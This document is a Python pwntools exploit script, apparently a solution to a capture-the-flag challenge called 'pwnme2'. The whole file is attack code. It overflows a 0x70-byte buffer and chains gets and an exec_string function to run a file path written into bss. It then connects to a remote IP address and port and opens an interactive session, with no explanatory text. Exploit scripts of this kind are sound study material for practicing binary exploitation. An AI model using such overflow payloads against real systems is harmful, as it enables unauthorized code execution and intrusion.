#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

def debug(addr = '0x080486f6'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

shellcode="/home/.flag1"

elf = ELF('/home/h11p/hackme/pwnme2')
exec_string=elf.symbols['exec_string']
print "%x" % exec_string
scanf_addr = elf.symbols['gets']
print "%x" % scanf_addr
bss_addr = elf.bss()
print "%x" % bss_addr
offset = 0x70

#io = process('/home/h11p/hackme/pwnme2')

io = remote('104.224.169.128', 18887)

payload = 'A' * offset
payload += p32(scanf_addr)
payload += p32(exec_string)
#payload += p32(scanf_fmt_addr)
payload += p32(bss_addr+0x20)

#debug()
io.sendline(payload)
io.sendline(shellcode)

io.interactive()

io.close()

